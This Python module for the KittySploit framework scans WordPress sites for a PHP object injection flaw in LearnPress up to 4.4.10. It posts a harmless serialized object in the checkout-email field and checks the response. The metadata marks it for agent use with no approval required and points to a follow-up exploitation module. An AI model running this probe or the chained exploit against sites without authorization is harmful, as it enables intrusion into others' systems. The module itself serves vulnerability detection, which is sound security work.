#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LearnPress <= 4.4.10 PHP object injection via checkout-email (CVE-2026-104736)."""

import secrets
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "learnpress"
_VULN_HIGH = (4, 4, 10)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "LearnPress CVE-2026-104736 PHP object injection detect",
        "description": (
            "Detects CVE-2026-104736 in LearnPress <= 4.4.10: guest checkout stores checkout-email "
            "in the LP session and later unsafely deserializes it. Sends a harmless stdClass probe "
            "via lp-ajax=checkout and checks for LP AJAX response markers."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-104736",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-104736",
            "https://github.com/murrez/CVE-2026-104736",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-104736.yaml",
        ],
        "modules": [
            "auxiliary/admin/http/learnpress_cve_2026_104736_poi",
        ],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "learnpress",
            "deserialization",
            "php",
            "cve-2026-104736",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["wordpress", "learnpress"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "deserialization", "from_detail": "checkout-email session"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/learnpress_cve_2026_104736_poi",
                ],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _path(self, suffix: str) -> str:
        base = self._wp_base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _version_vulnerable(self) -> bool:
        readme_path = self.wp_plugin_path(self._wp_base(), _PLUGIN, "readme.txt")
        response = self.http_request(method="GET", path=readme_path, allow_redirects=True)
        if response and response.status_code == 200:
            version = self.wp_extract_version_from_readme(response.text or "")
            if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
                return False
        version = self.wp_plugin_version(_PLUGIN, self._wp_base())
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._path("/"), allow_redirects=True)
        if home and home.status_code == 200:
            if "/wp-content/plugins/learnpress/" not in (home.text or ""):
                return False
        return True

    def _probe_payload(self) -> str:
        key = secrets.token_hex(2)
        serialized = f'O:8:"stdClass":1:{{s:4:"{key}";s:3:"poc";}}'
        return quote(serialized, safe="")

    def run(self):
        if not self._version_vulnerable():
            return False
        data = f"lp-ajax=checkout&checkout-email={self._probe_payload()}"
        response = self.http_request(
            method="POST",
            path=self._path("/"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        if not response or response.status_code != 200:
            return False
        body = response.text or ""
        if "LP_AJAX_START" not in body:
            return False
        if "invalid_email" in body.lower():
            return False
        self.set_info(
            severity="critical",
            reason="LearnPress CVE-2026-104736 — checkout-email LP AJAX injection surface",
            path="/",
            cve="CVE-2026-104736",
        )
        return True
